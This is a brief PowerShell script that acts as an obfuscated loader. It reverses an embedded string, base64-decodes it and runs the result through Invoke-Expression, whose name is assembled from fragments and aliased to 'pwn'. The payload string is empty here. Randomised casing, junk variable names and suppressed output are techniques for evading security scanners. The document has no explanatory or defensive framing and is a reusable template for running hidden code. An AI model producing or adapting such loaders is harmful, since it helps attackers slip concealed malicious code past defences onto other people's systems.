$8lRy = "" ;
$aoEXmf1wKt6TJPGCtzk30kCg = $8lRy.ToCharArray() ; [array]::Reverse($aoEXmf1wKt6TJPGCtzk30kCg) ; -join $aoEXmf1wKt6TJPGCtzk30kCg 2>&1> $null ;
$ToBhst = [sySTEM.TeXT.enCOdinG]::utf8.gEtstRING([SYstEM.ConveRt]::FrOMBase64sTriNG("$aoEXmf1wKt6TJPGCtzk30kCg")) ;
$y7SOglEYG = "iNV"+"OKe"+"-ex"+"pRe"+"SsI"+"On" ; NEW-ALiAS -NAme pWN -ValuE $y7SOglEYG -FOrCE ; pwn $ToBhst ;

